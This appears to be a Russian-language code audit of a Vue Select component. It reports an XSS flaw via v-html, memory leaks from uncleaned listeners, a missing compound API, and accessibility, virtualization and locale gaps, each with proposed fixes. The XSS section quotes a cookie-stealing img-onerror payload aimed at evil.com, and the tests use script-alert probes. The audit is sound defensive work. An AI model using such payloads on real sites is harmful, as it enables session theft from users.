---
title: Issues — Select
summary: Аудит Select — CRITICAL XSS через v-html (marker/noData), memory leak (ResizeObserver + keydown listeners без disconnect), нет dual-API (только schema-driven).
updated: 2026-05-10
audit-checklist: 60-point + Configuration support + Dual-API gap
source: lib/select/
related-doc: ../components/select.md
---

# Issues — Select

## Сводка

| Severity | Count | Categories |
|---|---|---|
| critical | 2 | C13 (XSS v-html × 3), H41 (memory leaks) |
| high | 6 | A2, A4-5, C17, L53, P (dual-API), H43 (virtualization) |
| medium | 4 | E29.5, F31, F32, G34 |
| low | 3 | E29.7, B10, N59 |

## Issue 1: CRITICAL — XSS через `v-html` в `marker` и `noData`

- **Категория:** C13 + security
- **Severity:** **critical**
- **Где:** [Select.vue:553](../../lib/select/Select.vue#L553), [Select.vue:562](../../lib/select/Select.vue#L562), [Select.vue:564](../../lib/select/Select.vue#L564)

### Что найдено

```vue
<div v-if="isQuery && item?.marker" v-html="item?.marker" :class="classItemSelectValue" />
...
<div v-if="!dataList?.length" :class="classDataListNoData" v-html="noData" />
<div v-else :class="classNoData" v-html="noData" />
```

- `item?.marker` — приходит из `dataSelect` items (пользовательский data). Используется для подсветки совпадений при фильтрации.
- `noData` — пользовательский prop / option, текст при пустой выдаче.

Оба пробрасываются в DOM через `v-html` без санитизации.

### Почему это проблема

- Если `dataSelect` приходит из API (например, search-по-БД с user-controlled query), злоумышленник может закинуть запись с `marker: "<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"`.
- `noData` менее опасен (статичный default), но если переопределён через `componentsOptions.Select.noData = userInput` — XSS.

### Что нужно сделать

**Опция A — slot вместо v-html (рекомендуется):**
1. В [Select.vue:553](../../lib/select/Select.vue#L553) заменить `v-html="item?.marker"` на:
   ```vue
   <slot name="marker" :item="item" :query="query" :class="classItemSelectValue">
     <span :class="classItemSelectValue">{{ item.marker || item[valueSelect] }}</span>
   </slot>
   ```
2. Marker-логика (highlighting matched substring) — переехать на template helper, который возвращает VNode с `<mark>` тегом, без HTML-строк.
3. Для `noData`:
   ```vue
   <slot name="empty">
     <div :class="classNoData">{{ noData }}</div>
   </slot>
   ```
   `noData: string` остаётся, но рендерится как text-node.

**Опция B — `dompurify` санитизация перед v-html.** Хуже DX, но если HTML-marker критичен — приемлемо.

4. Заменить text-highlight механизм: вместо string-сборки `<mark>` в `marker`, передавать в slot `query: string` и `text: string`, а пользовательский шаблон сам строит `<mark>`.
5. Type changes: убрать `marker?: string` из IDataItem (deprecate с warning).

### Acceptance criteria

- [ ] `<Select :data-select="[{ id: 1, value: 'X', marker: '<script>alert(1)</script>' }]">` — НЕ исполняет скрипт.
- [ ] Тест: payload с `<img src=x onerror=...>` в `marker` или `noData` — DOM не содержит `<img>`.
- [ ] Поиск/highlighting продолжает работать через slot или helper-функцию.

## Issue 2: CRITICAL — Memory leak (ResizeObserver + keydown listeners без cleanup)

- **Категория:** H41 (memory leaks)
- **Severity:** **critical**
- **Где:** [Select.vue:279-281](../../lib/select/Select.vue#L279-L281), [Select.vue:284-292](../../lib/select/Select.vue#L284-L292)

### Что найдено

```ts
onMounted(() => {
  Select.initStyle()
  if (autoFocus.value) openSelect()
  new ResizeObserver(() => {
    if (isOpenList.value) selectListWindow.value?.updatePosition()
  }).observe(selectBody.value as HTMLElement)
})

watch(isFocus, (value) => {
  if (value) document.addEventListener("keydown", openSelectOnEnter)
  else document.removeEventListener("keydown", openSelectOnEnter)
})
watch(isOpenList, (value) => {
  if (value) document.addEventListener("keydown", keydownSelect)
  else document.removeEventListener("keydown", keydownSelect)
})
```

Проблемы:
1. `new ResizeObserver(...)` — instance создан, но не сохранён в ref → нельзя disconnect. **Утечка observer + closure**.
2. Если компонент unmount'ится в момент `isFocus === true` — listener `openSelectOnEnter` остаётся на `document` навсегда.
3. То же для `keydownSelect` если unmount во время `isOpenList === true`.
4. Нет `onBeforeUnmount` хука.

### Почему это проблема

- В SPA с динамической навигацией: открыли select → перешли на другую страницу через keyboard → старый listener на document продолжает реагировать на keydown.
- При множественных Select на странице → накапливаются observers, замедляют resize.
- Long-lived apps (CRM, dashboards) — постепенная деградация.

### Что нужно сделать

1. В [Select.vue:276](../../lib/select/Select.vue#L276) сохранить observer в ref:
   ```ts
   const resizeObserver = ref<ResizeObserver>()
   onMounted(() => {
     resizeObserver.value = new ResizeObserver(...)
     resizeObserver.value.observe(selectBody.value)
   })
   onBeforeUnmount(() => {
     resizeObserver.value?.disconnect()
     document.removeEventListener("keydown", openSelectOnEnter)
     document.removeEventListener("keydown", keydownSelect)
   })
   ```
2. Альтернативно — использовать VueUse `useResizeObserver(target, callback)` — auto-cleanup.
3. Тест:
   ```ts
   const wrapper = mount(Select, { props: { dataSelect: [{id:1,value:'a'}] }, attachTo: document.body })
   wrapper.find('input').trigger('focus')
   const beforeUnmount = document.querySelectorAll('*').length
   wrapper.unmount()
   // assert listeners removed (sniff via spy or check that triggering keydown after unmount doesn't crash)
   ```
4. Cross-cutting: проверить Calendar (тот же паттерн), FixWindow, Menu, Dialog — везде где есть document-listeners.

### Acceptance criteria

- [ ] Memory profiler в DevTools после mount/unmount × 100 раз — heap не растёт линейно.
- [ ] `onBeforeUnmount` существует и вызывает disconnect/removeEventListener.
- [ ] Unit-тест на listener cleanup.

## Issue 3: Dual-API gap — нет compound `<Select><Option>` API

- **Категория:** P (Dual-API)
- **Severity:** high
- **Где:** [Select.d.ts:25-34](../../lib/select/Select.d.ts), вся [Select.vue](../../lib/select/Select.vue)

### Что найдено

API только schema-driven:
```vue
<Select :data-select="[{ id: 1, value: 'A' }, { id: 2, value: 'B' }]" key-select="id" value-select="value" />
```

Custom rendering каждого option возможен только через единый slot `selectItem` для всего списка. Нет per-option конфигурации (disabled, group, custom icon, custom render per item) через template-уровень.

### Почему это проблема

- Industry-standard (PrimeVue, Element Plus, Naive UI) поддерживают оба API.
- Use-case: «3 статичных опции с разной иконкой и свойством disabled» — schema-driven вынуждает строить массив объектов с per-item override-полями, type-safety теряется.
- Compound API:
  ```vue
  <Select v-model="x">
    <SelectOption value="a" disabled><Icons type="ban" /> Locked</SelectOption>
    <SelectOption value="b">Free</SelectOption>
    <SelectGroup label="Premium">
      <SelectOption value="c">Premium A</SelectOption>
    </SelectGroup>
  </Select>
  ```

### Что нужно сделать

**Параллельный compound API без breaking change:**

1. Создать `lib/select/SelectOption.vue`:
   ```vue
   <script setup lang="ts">
   import { inject } from "vue"
   const ctx = inject(SELECT_CONTEXT)
   const props = defineProps<{ value: any; disabled?: boolean; label?: string }>()
   ctx?.registerOption({ value: props.value, disabled: props.disabled, label: props.label, slot: useSlots().default })
   </script>
   <template><!-- not rendered directly; rendered via parent context --></template>
   ```
2. Создать `lib/select/SelectGroup.vue` — `provide`-родитель для group label.
3. В `Select.vue` создать `provide(SELECT_CONTEXT, { registerOption, unregisterOption })`. При mount/update children собирают свои options в reactive Map.
4. Resolve-приоритет: если `dataSelect` prop передан — он выигрывает (legacy schema). Если children `<SelectOption>` есть — берутся они.
5. Type registration:
   ```ts
   // SelectContext.d.ts
   export interface SelectContext {
     registerOption(opt: SelectOptionDescriptor): void
     unregisterOption(value: any): void
   }
   export const SELECT_CONTEXT: InjectionKey<SelectContext>
   ```
6. Children walk при render — используем `useSlots()` + `Fragment` flattening для обработки conditional `<template v-if>`.
7. Документация: новый раздел в [Documentation/components/select.md](../components/select.md) §10.5 «Compound API».
8. Codemod (см. Issue 28-aria.md): автозамена опционально.

### Acceptance criteria

- [ ] Schema-driven `<Select :data-select=[...]>` продолжает работать без изменений.
- [ ] Compound `<Select><SelectOption value="a">A</SelectOption></Select>` рендерит select с одной опцией.
- [ ] Можно смешивать (но schema выигрывает / документировано).
- [ ] Type-safe: `<SelectOption :value=42>` инфёрит value type.

## Issue 4: SSR styles + sideEffects/exports map (cross-cutting)

- **Категория:** C17, A2, A4, A5
- **Severity:** high

См. [button.md Issue 1, Issue 8, Issue 9](./button.md).

## Issue 5: Нет componentsStyle global fallback

- **Категория:** L53
- **Severity:** high

См. [input.md Issue 2](./input.md). Select имеет ту же проблему — `mode` не учитывает `Select.componentsStyle()`.

## Issue 6: `unstyled: true` не обрабатывается

- **Категория:** L53
- **Severity:** high

См. [button.md Issue 14](./button.md).

## Issue 7: Нет виртуализации списка — лагает при >500 items

- **Категория:** H43 (виртуализация)
- **Severity:** high
- **Где:** [Select.vue:540-570](../../lib/select/Select.vue) (рендер dropdown списка)

### Что найдено

Все `dataList` items рендерятся в DOM одновременно. При `dataSelect` с >500 элементами:
- Скролл лагает.
- Initial open — задержка 200-500ms.
- Memory растёт (каждый item — несколько DOM узлов + reactive computed).

### Почему это проблема

- Use-case: select country (~250 элементов), select из CRM (~10000 contacts) — фактически невозможно использовать без custom virtualization.

### Что нужно сделать

1. Интегрировать `vue-virtual-scroller` (или TanStack Virtual `@tanstack/vue-virtual`) для виртуализации dropdown list.
2. Добавить prop `virtual?: boolean` (default false для backward compat) или `virtualThreshold?: number` (default 100 — auto-enable если items.length > threshold).
3. При virtual mode: render только visible window + 1-2 buffer items.
4. Tooltip в [Documentation/components/select.md](../components/select.md): performance benchmark до/после.

### Acceptance criteria

- [ ] `<Select :data-select="thousand_items" virtual>` — first render <50ms.
- [ ] Скролл 60fps в Chrome DevTools profiler.

## Issue 8: aria-live для search results отсутствует

- **Категория:** E29.5 (announcements)
- **Severity:** medium
- **Где:** [Select.vue:540-570](../../lib/select/Select.vue) (dropdown render)

### Что найдено

При фильтрации (query) screen reader не объявляет «X results found». Пользователь печатает в search input и не получает feedback.

### Что нужно сделать

1. Добавить hidden live region:
   ```vue
   <div aria-live="polite" aria-atomic="true" class="sr-only">
     {{ dataList?.length }} {{ t("select.resultsCount") }}
   </div>
   ```
2. Добавить ключ в [lib/locale/locales/en.ts](../../lib/locale/locales/en.ts) и [ru.ts](../../lib/locale/locales/ru.ts).

### Acceptance criteria

- [ ] axe-core тест проходит для Select с открытым dropdown.

## Issue 9: RTL — left/right в `right-0`, `mr-2`, etc.

- **Категория:** F31

См. [switch.md Issue 8](./switch.md). Select имеет много left/right в dropdown позиционировании.

## Issue 10: Локаль для filtering search query

- **Категория:** F32
- **Severity:** medium
- **Где:** [Select.vue](../../lib/select/Select.vue) (filter logic)

### Что найдено

`String.includes(query)` для фильтрации. Не учитывает diacritics (немецкое `ü` ≠ `u`), case-sensitive в некоторых локалях.

### Что нужно сделать

1. Использовать `Intl.Collator(locale, { sensitivity: 'base' })` для сравнения.
2. Подключить через `FishtVue.getActiveLocale()`.
3. Альтернатива — `localeCompare`.

## Issue 11: prefers-reduced-motion + print + colors hardcode

- **Категория:** E29.7, N59, B10
- **Severity:** low

См. [button.md Issue 10, 15](./button.md), [switch.md Issue 12](./switch.md).

## Cross-cutting: Configuration support

| Настройка | Поддержано? | Комментарий |
|---|---|---|
| `componentsOptions.Select` | ✅ | mode, autoFocus, valueSelect, keySelect, и др. |
| `componentsStyle` global | ❌ | Issue 5 |
| `unstyled: true` | ❌ | Issue 6 |
| Theme tokens vs hardcode | ⚠️ | через theme-* tokens частично |
| Runtime theme switch | ⚠️ | через CSS-vars OK |
| `t()` для текста | ❌ | `noData` хардкоден prop, нет fallback к `t("select.noData")` |
| Runtime locale switch | ❌ | search-filter не использует locale (Issue 10) |

## Dual-API gap

См. [Issue 3](#issue-3-dual-api-gap-—-нет-compound-selectoption-api).

**Текущий API:** schema-driven `<Select :data-select="[...]" />`.
**Предлагаемый параллельный compound API:** `<Select><SelectOption /></Select>`.
**Industry parallel:** Element Plus `<el-select><el-option>`, Naive UI `<n-select :options>` + `<n-select-option>`, PrimeVue `<Dropdown :options>` + `<DropdownItem>`.
**Migration:** schema-driven остаётся primary; compound — opt-in через children. Не breaking.
